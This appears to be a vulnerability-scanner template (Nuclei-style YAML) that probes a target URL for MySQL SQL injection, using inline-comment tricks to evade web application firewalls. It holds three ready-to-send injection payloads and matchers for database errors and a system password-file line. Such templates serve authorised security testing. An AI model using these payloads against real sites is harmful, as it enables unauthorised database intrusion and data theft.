# gap: sqli-waf-bypass-inline-comment
id: sqli-waf-bypass-inline-comment

info:
  name: SQL Injection via MySQL Inline Comment WAF Bypass
  author: TyrusRC
  severity: high
  description: |
    Tests SQL injection using MySQL version-conditional inline comments
    (/*!50000...*/) to bypass WAFs that block the literal keyword UNION SELECT.
    The MySQL server executes the comment content if its version >= 5.00.00.
  reference:
    - https://dev.mysql.com/doc/refman/8.0/en/comments.html
  tags: custom,sqli,waf-bypass,mysql

http:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'/*!50000UNION*//*!50000SELECT*/1,2,3--"
      - "{{BaseURL}}/?id=1' UN/**/ION SEL/**/ECT 1,2,3--"
      - "{{BaseURL}}/?id=1' /*!50000%55NION*/ /*!50000%53ELECT*/ 1,2,3--"

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "You have an error in your SQL syntax"
          - "mysql_fetch"
          - "Warning: mysql"
          - "Unclosed quotation mark"
          - "unterminated quoted string"
          - "SQLSTATE"
        condition: or

      - type: regex
        regex:
          - "root:x:0:0:"
          - "\\d+\\.\\d+\\.\\d+-MariaDB"
          - "mysql_native_password"
